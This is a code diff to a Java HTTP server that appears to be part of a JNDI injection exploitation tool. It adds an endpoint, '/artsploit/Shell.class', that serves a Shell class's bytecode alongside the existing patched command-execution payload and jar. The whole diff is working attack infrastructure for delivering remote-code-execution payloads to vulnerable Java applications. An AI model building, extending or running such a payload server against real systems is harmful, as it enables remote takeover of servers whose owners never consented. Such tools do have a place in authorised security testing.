@@ -18,6 +18,7 @@ import static org.apache.commons.text.StringEscapeUtils.escapeJava;
 public class HttpServer implements HttpHandler {
 
 	byte[] exportByteCode;
+	byte[] exportShellByteCode;
 	byte[] exportJar;
 
 	public static void start() throws Exception {
@@ -29,7 +30,9 @@ public class HttpServer implements HttpHandler {
 	}
 
 	public HttpServer() throws Exception {
+		ClassPool classPool = ClassPool.getDefault();
 		exportByteCode = patchBytecode(ExportObject.class, Config.command, "xExportObject");
+		exportShellByteCode = classPool.get(Shell.class.getName()).toBytecode();
 		exportJar = createJar(exportByteCode, "xExportObject");
 	}
 
@@ -76,6 +79,11 @@ public class HttpServer implements HttpHandler {
 					//send xExportObject bytecode back to client
 					httpExchange.sendResponseHeaders(200, exportByteCode.length);
 					httpExchange.getResponseBody().write(exportByteCode);
+					break;
+				case "/artsploit/Shell.class":
+					//send xExportObject bytecode back to client
+					httpExchange.sendResponseHeaders(200, exportShellByteCode.length);
+					httpExchange.getResponseBody().write(exportShellByteCode);
 					break;
 
 				case "/xExportObject.jar":
